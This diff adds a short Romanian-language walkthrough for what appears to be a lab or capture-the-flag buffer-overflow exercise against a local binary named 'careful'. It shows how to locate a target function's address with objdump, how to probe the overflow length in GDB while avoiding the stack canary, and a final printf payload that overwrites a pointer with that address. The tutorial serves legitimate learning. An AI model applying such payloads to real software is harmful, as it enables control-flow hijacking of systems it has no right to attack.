@@ -1,0 +1,16 @@
+Trebuie să afli la ce adresă de memorie se află funcția not_your_surgery. Deschide terminalul și rulează:
+
+Bash
+objdump -d careful -M intel | grep not_your_surgery
+Notează-ți adresa afișată
+
+gdb ./careful
+Rulează programul în GDB (run) și introdu un număr de caractere (de ex. 30 de "A"-uri, 40 de "A"-uri, etc.).
+
+Dacă programul îți dă Segmentation Fault pe o adresă plină de 0x41414141 (codul hex pentru "A"), înseamnă că ai suprascris acel pointer/variabilă cerută.
+
+Dacă programul spune *** stack smashing detected ***, înseamnă că ai scris prea mult și ai stricat canarul. Scade numărul de "A"-uri până când programul pică "curat" (fără stack smashing).
+
+În Bash, printf este adesea mai robust și mai sigur decât echo când vine vorba de caractere speciale sau invizibile
+
+printf "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x34\x12\x40\x00\x00\x00\x00\x00" | ./careful
